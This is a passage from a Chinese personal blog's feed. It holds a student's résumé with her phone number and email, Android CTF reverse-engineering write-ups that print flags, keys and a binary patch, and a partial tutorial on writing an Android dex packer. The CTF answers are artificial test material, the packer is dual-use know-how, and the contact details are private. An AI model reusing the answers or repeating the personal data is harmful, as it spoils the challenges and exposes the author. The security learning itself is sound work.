    
    <summary type="html">
    
      
      
        &lt;p&gt;周信芳先生、马连良先生均以《四进士》享名，麒派的宋士杰苍劲老辣，马派潇洒油滑。&lt;/p&gt;
&lt;p&gt;我本人完整听过麒麟童周信芳先生的电影，张学津先生、陈少云老师那一版，还有别的版本的一些片段。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;宋士杰是一个讼师。他们的职业是包打官司，即包揽词讼。凡有衙门处
      
    
    </summary>
    
    
      <category term="听戏" scheme="https://github.com/Cracke-S-J/categories/opera/"/>
    
    
      <category term="京剧" scheme="https://github.com/Cracke-S-J/tags/%E4%BA%AC%E5%89%A7/"/>
    
  </entry>
  
  <entry>
    <title>简历</title>
    <link href="https://github.com/Cracke-S-J/2019/05/29/resume/"/>
    <id>https://github.com/Cracke-S-J/2019/05/29/resume/</id>
    <published>2019-05-29T12:32:02.000Z</published>
    <updated>2020-03-09T13:32:15.520Z</updated>
    
    <content type="html"><![CDATA[<p>2019-09-22版。</p><p>有pdf版，会好看一些。</p><hr><h1 id="孙少洁"><a href="#孙少洁" class="headerlink" title="孙少洁"></a>孙少洁</h1><p>女 | 19 | 本科在读 | 工作经验：2019-1-14 至今</p><p>2018 - 2022 北京科技大学 | 计算机科学与技术 | 博客：cracke-s-j.github.io</p><p>电话：13697842656  |  email：<a href="mailto:cracke_sun@163.com" target="_blank" rel="noopener">cracke_sun@163.com</a></p><h2 id="技术栈"><a href="#技术栈" class="headerlink" title="技术栈"></a>技术栈</h2><ul><li>编译语言<ul><li>熟悉 Java、C++，熟练运用 python，具有编写脚本、开发工具的能力。</li><li>熟悉 ARM、x86/64 等指令集，了解一定编译原理。</li><li>熟悉基本算法与数据结构，熟练运用树上、图上各类算法。</li></ul></li><li>Android 逆向<ul><li>熟悉 Android 逆向基本流程，熟悉静态分析、动态调试。</li><li>熟悉 Android 加壳技术，了解一些通用脱壳机的原理，并能够手动脱一、二、三代壳。</li><li>熟悉 JNI 编程，读过 Android 源码，了解 dvm、art 虚拟机运行机制、Android 打包、运行过程。</li></ul></li><li>信息安全<ul><li>熟悉 pwn，熟悉基本二进制漏洞，了解 kernel pwn。</li><li>了解基本 web 安全，熟悉 OWASP，会基本的绕过。</li><li>了解常用加解密算法；会基本的密码学攻击。</li><li>了解智能合约 top 9 漏洞，会基本代码审计。</li></ul></li><li>熟悉渗透测试基本流程，能独立完成 Android、iOS 客户端、接口渗透测试。</li></ul><h2 id="项目-工作经历"><a href="#项目-工作经历" class="headerlink" title="项目/工作经历"></a>项目/工作经历</h2><ul><li>2019-8-5 至今——XCalibyte——软件工程师<ul><li>独立负责完成编译器 preprocess 部分，用 Hook 技术抓取编译流程进行预处理，兼容 Linux、MacOS、Windows。</li><li>Electron 框架编写客户端，preprocessor 的 wrapper。</li><li>为 代码静态分析核心引擎 做测试，分析各个部分算法复杂度。</li><li>学习编译器及代码漏洞分析技术。</li></ul></li><li>2019-1-14——2019-8-4——梆梆安全——安全服务工程师<ul><li>主要方向是 Android 逆向，主要负责渗透测试、培训、应急响应、研究新技术。</li><li>负责智能合约安全研究，完成“智能合约源码审计标准”，并培训新人相关知识。</li></ul></li><li>2018-9-14——2019-1-13——806 实验室、Ever 404 Club<ul><li>开发 Android 一代壳，用到 Dex 加密、动态加载技术。</li><li>逆向分析过 Android 市场上多款 App，写过插件，出过应用修改版。</li><li>在保密项目无源程序的情况下，独立将几万行 sparc 汇编翻译为 C 语言。</li><li>参与“基于深度学习的网络爬虫鉴别”项目，主要负责机器学习模型建立与数据统计。</li></ul></li><li>CTF（全国大学生信息安全竞赛）华北赛区二等奖；Noip（全国青少年计算机程序设计竞赛）联赛二等奖；蓝桥杯程序设计竞赛校赛一等奖（第三名）；ACM-ICPC（国际大学生程序设计竞赛）进入校冬训队。</li></ul><h2 id="自我描述"><a href="#自我描述" class="headerlink" title="自我描述"></a>自我描述</h2><ul><li>热爱技术；热爱学习；热爱分享；心态稳，不畏困难。现学现卖的能力很强。</li><li>初中开始接触编程，对计算机尤其是逆向安全有浓厚的兴趣与长久的热情。</li><li>现本科大二在读，课余时间较多，紧急事件随叫随到，接受任何时间加班。</li><li>现在仍在不断学习，简历会随时更新调整。没有研究过怎么写简历。</li></ul><h2 id="兴趣爱好"><a href="#兴趣爱好" class="headerlink" title="兴趣爱好"></a>兴趣爱好</h2><ul><li>写代码</li><li>逆向分析市场上一些 APP</li><li>为开发的朋友的 App 加固</li><li>逛论坛、逛 github、参加技术交流会议</li><li>养猫、云养猫</li><li>中国传统曲艺，京评梆曲</li></ul><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;2019-09-22版。&lt;/p&gt;
&lt;p&gt;有pdf版，会好看一些。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&quot;孙少洁&quot;&gt;&lt;a href=&quot;#孙少洁&quot; class=&quot;headerlink&quot; title=&quot;孙少洁&quot;&gt;&lt;/a&gt;孙少洁&lt;/h1&gt;&lt;p&gt;女 | 19 | 本科在读 | 工作经验：
      
    
    </summary>
    
    
      <category term="简历" scheme="https://github.com/Cracke-S-J/categories/resume/"/>
    
    
      <category term="resume" scheme="https://github.com/Cracke-S-J/tags/resume/"/>
    
  </entry>
  
  <entry>
    <title>小菜比ssj吹头发记</title>
    <link href="https://github.com/Cracke-S-J/2019/05/29/CTF-android/"/>
    <id>https://github.com/Cracke-S-J/2019/05/29/CTF-android/</id>
    <published>2019-05-29T11:42:47.000Z</published>
    <updated>2019-05-31T09:14:19.081Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ssj是一只小菜比，ta应公司要求要写吹头发android逆向屁屁踢，所以ta需要起码做点题。</p></blockquote><h2 id="XCTF-1th-apk逆向"><a href="#XCTF-1th-apk逆向" class="headerlink" title="XCTF 1th apk逆向"></a>XCTF 1th apk逆向</h2><p>这是一道签到题，可以动态调试，可以还原算法，可以打印log。ssj选择了还原算法，因为就是一个md5。</p><p><strong>flag{bc72f242a6af3857};</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchAlgorithmException </span>&#123;</span><br><span class="line">    String userName = <span class="string">"Tenshine"</span>;</span><br><span class="line">    MessageDigest digest =MessageDigest.getInstance(<span class="string">"MD5"</span>);</span><br><span class="line">    digest.update(userName.getBytes());</span><br><span class="line">    String hexstr = toHexString(digest.digest(), <span class="string">""</span>);</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; hexstr.length(); i += <span class="number">2</span>) &#123;</span><br><span class="line">        sb.append(hexstr.charAt(i));</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(sb.toString());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">toHexString</span><span class="params">(<span class="keyword">byte</span>[] bytes, String separator)</span> </span>&#123;</span><br><span class="line">    StringBuilder hexString = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">byte</span> b : bytes) &#123;</span><br><span class="line">        String hex = Integer.toHexString(b &amp; <span class="number">255</span>);</span><br><span class="line">        hexString.append(hex).append(separator);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hexString.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="XCTF-easy-dex"><a href="#XCTF-easy-dex" class="headerlink" title="XCTF easy-dex"></a>XCTF easy-dex</h2><p>本题flag: <strong>qwb{TH3y_Io&lt;e_EACh_OTh3r_FOrEUER}</strong></p><p>这题dex是动态加载的，算是0代壳吧，加载条件是10秒里晃手机100次。IDA反编译so，看到它是先加载dex，然后优化了dex，把原dex删了，我们要做的是得到原dex，然后分析加密算法。</p><ol><li><p>hook掉remove函数，阻止文件被删除。</p></li><li><p>直接将存储在lib中的加密后的dex异或解密，再zlib解压。</p></li><li><p>静态修改so，把remove函数patch掉。（本人用的方法，上面两个只是说说）</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:0000275A                 MOV             R0, R11</span><br><span class="line">.text:0000275C                 BL              sub_2368</span><br><span class="line">.text:00002760                 ADD             R0, SP, #0x160+filename ; filename</span><br><span class="line">.text:00002762                 BLX             remove ; 把这句patch掉</span><br><span class="line">.text:00002766                 LDR             R1, =(aFindmydex - 0x2770)</span><br><span class="line">.text:00002768                 MOVS            R0, #4</span><br><span class="line">.text:0000276A                 LDR             R2, =(aCongratulation - 0x2772)</span><br><span class="line">.text:0000276C                 ADD             R1, PC  ; &quot;FindMyDex&quot;</span><br><span class="line">.text:0000276E                 ADD             R2, PC  ; &quot;Congratulations!! You made it!&quot;</span><br><span class="line">.text:00002770                 BLX             __android_log_print</span><br></pre></td></tr></table></figure><p>分析dex，看出是Twofish算法,在线解密。<br>密文是：884df2da1105d62ce06d551f18a590ad40ad805405a29ee21246e647059dc2c6751dd40670fc51540916cd5fde0c2f4d。<br>密钥是：I have a male fish and a female fish.</p><h2 id="XCTF-黑客精神"><a href="#XCTF-黑客精神" class="headerlink" title="XCTF 黑客精神"></a>XCTF 黑客精神</h2><p>本题坑点在于，要给它开读写权限，否则只能手动翻找flag格式…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.rodata:00002E77                 DCB 0x66 ; f</span><br><span class="line">.rodata:00002E78                 DCB 0x6C ; l</span><br><span class="line">.rodata:00002E79                 DCB 0x61 ; a</span><br><span class="line">.rodata:00002E7A                 DCB 0x67 ; g</span><br><span class="line">.rodata:00002E7B                 DCB 0x2C ; ,</span><br><span class="line">.rodata:00002E7C                 DCB 0xE6</span><br><span class="line">.rodata:00002E7D                 DCB 0xA0</span><br><span class="line">.rodata:00002E7E                 DCB 0xBC</span><br><span class="line">.rodata:00002E7F                 DCB 0xE5</span><br><span class="line">.rodata:00002E80                 DCB 0xBC</span><br><span class="line">.rodata:00002E81                 DCB 0x8F</span><br><span class="line">.rodata:00002E82                 DCB 0xE4</span><br><span class="line">.rodata:00002E83                 DCB 0xB8</span><br><span class="line">.rodata:00002E84                 DCB 0xBA</span><br><span class="line">.rodata:00002E85                 DCB 0x78 ; x</span><br><span class="line">.rodata:00002E86                 DCB 0x6D ; m</span><br><span class="line">.rodata:00002E87                 DCB 0x61 ; a</span><br><span class="line">.rodata:00002E88                 DCB 0x6E ; n</span><br><span class="line">.rodata:00002E89                 DCB 0x7B ; &#123;</span><br><span class="line">.rodata:00002E8A                 DCB 0xE2</span><br><span class="line">.rodata:00002E8B                 DCB 0x80</span><br><span class="line">.rodata:00002E8C                 DCB 0xA6</span><br><span class="line">.rodata:00002E8D                 DCB 0xE2</span><br><span class="line">.rodata:00002E8E                 DCB 0x80</span><br><span class="line">.rodata:00002E8F                 DCB 0xA6</span><br><span class="line">.rodata:00002E90                 DCB 0x7D ; &#125;</span><br></pre></td></tr></table></figure><p>密文：EoPAoY62@ElRD；密钥：W3_arE_whO_we_ARE</p><p>加密算法就是一个异或。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> key[] = <span class="string">"W3_arE_whO_we_ARE"</span>; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Encode</span><span class="params">(<span class="keyword">char</span> s[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(s); </span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">2016</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i != len;i++) &#123; </span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">3</span> == <span class="number">1</span>)&#123; </span><br><span class="line">            j = (j+<span class="number">5</span>)%<span class="number">16</span>; </span><br><span class="line">            s[i] = s[i]^key[j+<span class="number">1</span>]; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(i%<span class="number">3</span> == <span class="number">2</span>) &#123; </span><br><span class="line">            j = (j+<span class="number">7</span>)%<span class="number">15</span>; </span><br><span class="line">            s[i] = s[i]^key[j+<span class="number">2</span>]; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span>&#123; </span><br><span class="line">            j = (j+<span class="number">3</span>)%<span class="number">13</span>; </span><br><span class="line">            s[i] = s[i]^key[j+<span class="number">3</span>]; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="XCTF-love你是谁"><a href="#XCTF-love你是谁" class="headerlink" title="XCTF love你是谁"></a>XCTF love你是谁</h2><p>一波翻找直接找到了flag。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const-string v7, <span class="string">"You get the sorted flag\uff1a20667 25105 26159 36924"</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;ssj是一只小菜比，ta应公司要求要写吹头发android逆向屁屁踢，所以ta需要起码做点题。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;XCTF-1th-apk逆向&quot;&gt;&lt;a href=&quot;#XCTF-1th-apk逆向&quot; class=&quot;h
      
    
    </summary>
    
    
      <category term="编程" scheme="https://github.com/Cracke-S-J/categories/programming/"/>
    
    
      <category term="CTF" scheme="https://github.com/Cracke-S-J/tags/CTF/"/>
    
      <category term="android" scheme="https://github.com/Cracke-S-J/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>小菜比ssj写了一个壳子</title>
    <link href="https://github.com/Cracke-S-J/2019/05/17/ssj-android-shell-0th/"/>
    <id>https://github.com/Cracke-S-J/2019/05/17/ssj-android-shell-0th/</id>
    <published>2019-05-17T11:38:07.000Z</published>
    <updated>2019-07-01T10:01:49.924Z</updated>
    
    <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>nemo大佬来北京，聊天中问起我最近有没有写代码，我一想，好像是真没有，所以单纯是想来写个代码。</p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>零代壳，稍微明白点的人用010就（或者什么方法都能）可以拿掉，但是因为太垃圾通用脱壳机不能脱，可以挡一些不是很明白的人hhh，批话王。思路是从百度剽窃的，后续还会升级，再加一些其它加固措施。</p><h3 id="三部分"><a href="#三部分" class="headerlink" title="三部分"></a>三部分</h3><p>整个过程主要有三部分，第一是源apk，第二是那个壳（？可以这么叫），第三是一个加密工具，把前2个合成一个apk。前两个是android工程，第三个是用什么写都行此处用的java。</p><h4 id="源apk"><a href="#源apk" class="headerlink" title="源apk"></a>源apk</h4><p>这个就是源apk，这个要注意的是写的时候要有一个application。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyApplication</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">        Log.i(<span class="string">"demo"</span>, <span class="string">"source apk onCreate:"</span>+<span class="keyword">this</span>);</span><br><span class="line">        Toast.makeText(MyApplication.<span class="keyword">this</span>,<span class="string">"application,start!"</span>,Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>application标签里，android:name那个地方写我们写的application，否则就是默认系统给创建的。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">".MyApplication"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:allowBackup</span>=<span class="string">"false"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:icon</span>=<span class="string">"@mipmap/ic_launcher"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:roundIcon</span>=<span class="string">"@mipmap/ic_launcher_round"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:supportsRtl</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:theme</span>=<span class="string">"@style/AppTheme"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:ignore</span>=<span class="string">"GoogleAppIndexingWarning"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".MainActivity"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="那个壳"><a href="#那个壳" class="headerlink" title="那个壳"></a>那个壳</h4><p>两个类，代码写的已经很明白了，不多解释。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyApplication</span> <span class="keyword">extends</span> <span class="title">Application</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String appkey = <span class="string">"APPLICATION_CLASS_NAME"</span>;</span><br><span class="line">    <span class="keyword">private</span> String apkFileName;</span><br><span class="line">    <span class="keyword">private</span> String libPath;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//attachBaseContext执行在onCreate前，重写它来加载源apk</span></span><br><span class="line">    <span class="meta">@RequiresApi</span>(api = Build.VERSION_CODES.KITKAT)</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">attachBaseContext</span><span class="params">(Context base)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.attachBaseContext(base);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            File odex = <span class="keyword">this</span>.getDir(<span class="string">"payload_odex"</span>, MODE_PRIVATE);</span><br><span class="line">            File libs = <span class="keyword">this</span>.getDir(<span class="string">"payload_lib"</span>, MODE_PRIVATE);</span><br><span class="line">            String odexPath = odex.getAbsolutePath();</span><br><span class="line">            libPath = libs.getAbsolutePath();</span><br><span class="line">            apkFileName = odex.getAbsolutePath() + <span class="string">"/payload.apk"</span>;</span><br><span class="line">            File dexFile = <span class="keyword">new</span> File(apkFileName);</span><br><span class="line">            Log.i(<span class="string">"demo"</span>, <span class="string">"apk size:"</span>+dexFile.length());</span><br><span class="line">            <span class="keyword">if</span> (!dexFile.exists()) &#123;</span><br><span class="line">                dexFile.createNewFile();</span><br><span class="line">                <span class="keyword">byte</span>[] dexdata = <span class="keyword">this</span>.readDexFileFromApk();</span><br><span class="line">                <span class="keyword">this</span>.splitPayLoadFromDex(dexdata);</span><br><span class="line">            &#125;</span><br><span class="line">            Object currentActivityThread = RefInvoke.invokeStaticMethod(</span><br><span class="line">                    <span class="string">"android.app.ActivityThread"</span>, <span class="string">"currentActivityThread"</span>,</span><br><span class="line">                    <span class="keyword">new</span> Class[] &#123;&#125;, <span class="keyword">new</span> Object[] &#123;&#125;);</span><br><span class="line">            String packageName = <span class="keyword">this</span>.getPackageName();</span><br><span class="line">            ArrayMap mPackages = (ArrayMap) RefInvoke.getFieldOjbect(</span><br><span class="line">                    <span class="string">"android.app.ActivityThread"</span>, currentActivityThread,</span><br><span class="line">                    <span class="string">"mPackages"</span>);</span><br><span class="line">            <span class="keyword">assert</span> mPackages != <span class="keyword">null</span>;</span><br><span class="line">            WeakReference wr = (WeakReference) mPackages.get(packageName);</span><br><span class="line">            <span class="keyword">assert</span> wr != <span class="keyword">null</span>;</span><br><span class="line">            DexClassLoader dLoader = <span class="keyword">new</span> DexClassLoader(apkFileName, odexPath,</span><br><span class="line">                    libPath, (ClassLoader) RefInvoke.getFieldOjbect(</span><br><span class="line">                    <span class="string">"android.app.LoadedApk"</span>, wr.get(), <span class="string">"mClassLoader"</span>));</span><br><span class="line">            RefInvoke.setFieldObject(<span class="string">"android.app.LoadedApk"</span>, <span class="string">"mClassLoader"</span>,</span><br><span class="line">                    wr.get(), dLoader);</span><br><span class="line">            Log.i(<span class="string">"demo"</span>,<span class="string">"classloader:"</span>+dLoader);</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Object actObj = dLoader.loadClass(<span class="string">"com.ssj.crackeme.forceapkobj.MainActivity"</span>);</span><br><span class="line">                Log.i(<span class="string">"demo"</span>, <span class="string">"actObj:"</span>+actObj);</span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                Log.i(<span class="string">"demo"</span>, <span class="string">"activity:"</span>+Log.getStackTraceString(e));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Log.i(<span class="string">"demo"</span>, <span class="string">"error:"</span>+Log.getStackTraceString(e));</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequiresApi</span>(api = Build.VERSION_CODES.KITKAT)</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span 